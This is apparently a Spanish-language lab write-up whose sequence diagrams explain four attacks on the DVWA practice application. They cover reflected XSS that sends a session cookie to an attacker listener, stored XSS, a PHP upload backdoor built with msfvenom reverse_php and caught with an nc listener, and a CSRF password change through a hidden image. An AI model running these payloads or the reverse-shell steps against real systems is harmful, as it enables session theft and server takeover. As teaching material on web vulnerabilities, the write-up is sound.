Vulnerabilidad 1 — XSS Reflejado

El servidor devuelve el script del atacante sin sanitizar. El navegador de la víctima lo ejecuta y envía su cookie al atacante.

sequenceDiagram actor A as 👤 Atacante (Kali) actor V as 👤 Víctima participant S as 🖥️ Servidor DVWA Note over A: Abre listener
python3 -m http.server 8888 A->>V: Envía enlace malicioso
xss_r/?name=<script>...cookie...</script> V->>S: Víctima hace clic
GET /?name=<script>new Image()... Note over S: ❌ NO sanitiza el input
Refleja el script en HTML S->>V: HTML con script incrustado
<h2>Hello <script>...</script></h2> Note over V: Navegador ejecuta JS
como código legítimo del sitio V->>A: GET /?c=PHPSESSID=18ff22346f0f579ba5604b1bc150c45f Note over A: ✅ Cookie recibida en consola Note over A: Inyecta cookie en F12
document.cookie = "PHPSESSID=..." A->>S: Accede como la víctima
sin contraseña
🔑 Clave: el servidor refleja el input sin codificarlo. El navegador no distingue entre código del sitio y código inyectado.

Vulnerabilidad 2 — XSS Almacenado

El payload se guarda en la base de datos y se ejecuta para TODOS los usuarios que visitan la página.

sequenceDiagram actor A as 👤 Atacante participant S as 🖥️ Servidor DVWA participant DB as 🗄️ Base de Datos actor V1 as 👤 Víctima 1 actor V2 as 👤 Víctima 2 Note over A: F12 → cambia maxlength
de 50 a 100 en el HTML A->>S: POST con payload en campo Message
<script>window.location.href="https://google.com"</script> S->>DB: ❌ Guarda script sin sanitizar
INSERT INTO guestbook... Note over DB: ☠️ Script almacenado
permanentemente V1->>S: Visita la página de XSS Stored S->>DB: SELECT comment FROM guestbook DB->>S: Devuelve el script malicioso S->>V1: HTML con script incluido Note over V1: 🔴 Redirigido a google.com
automáticamente V2->>S: Visita la página (otro día) S->>V2: Mismo HTML con script Note over V2: 🔴 También redirigido
sin hacer nada Note over A: Para restaurar:
UPDATE guestbook SET comment = REPLACE(...)
🔑 Clave: a diferencia del Reflejado, aquí la víctima no necesita hacer clic en ningún enlace malicioso. Solo visitar la página es suficiente.

Vulnerabilidad 3 — Upload Backdoor

El servidor acepta cualquier archivo sin verificar si es imagen. Un PHP malicioso se ejecuta y abre una conexión inversa al atacante.

sequenceDiagram actor A as 👤 Atacante (Kali) participant S as 🖥️ Servidor DVWA participant FS as 📁 /uploads/ Note over A: 1. Genera payload PHP
msfvenom -p php/reverse_php
LHOST=127.0.0.1 LPORT=4444 Note over A: 2. Abre listener Netcat
nc -lvnp 4444 ← espera conexión A->>S: 3. Sube danielaguirre.php
via formulario DVWA Note over S: ❌ NO valida extensión
ni contenido del archivo S->>FS: 4. Guarda PHP en
/dvwa/hackable/uploads/ A->>S: 5. Accede a la URL
GET /uploads/danielaguirre.php Note over S: 6. Apache ejecuta el PHP
(mod_php activo) S->>A: 7. Conexión TCP inversa
bash → 127.0.0.1:4444 Note over A: ✅ Shell obtenida
www-data@dvwa:~$
Control total del servidor
🔑 Clave: Apache ejecuta cualquier .php accesible por URL. DVWA no verifica que el archivo sea una imagen. El nc debe estar abierto ANTES de acceder a la URL.

Vulnerabilidad 4 — CSRF

El navegador envía cookies automáticamente. El atacante crea una página externa que hace peticiones al servidor en nombre de la víctima autenticada.

sequenceDiagram actor A as 👤 Atacante actor V as 👤 Víctima (autenticada) participant MS as 🌐 Sitio Malicioso participant DS as 🖥️ Servidor DVWA Note over V: Sesión activa en DVWA
Cookie: PHPSESSID=abc123 A->>MS: 1. Crea página con enlace oculto
img src="http://dvwa/csrf/?password_new=hacked" A->>V: 2. Envía link del sitio malicioso
"Mira esta página interesante" V->>MS: 3. Víctima abre la página Note over MS: 4. Página carga imagen invisible
que apunta a DVWA MS->>DS: 5. Petición automática del navegador
GET /csrf/?password_new=hacked&Change=Change
🍪 Cookie PHPSESSID=abc123 incluida automáticamente Note over DS: ❌ NO verifica origen
NO tiene token CSRF
Cree que es la víctima DS->>DS: 6. Cambia contraseña
a "hacked" Note over V: 😱 Contraseña cambiada
sin saberlo
sin hacer nada
🔑 Clave: el navegador adjunta cookies automáticamente a CUALQUIER petición hacia el dominio. El servidor no puede distinguir si la petición fue intencional o forjada por un sitio externo.
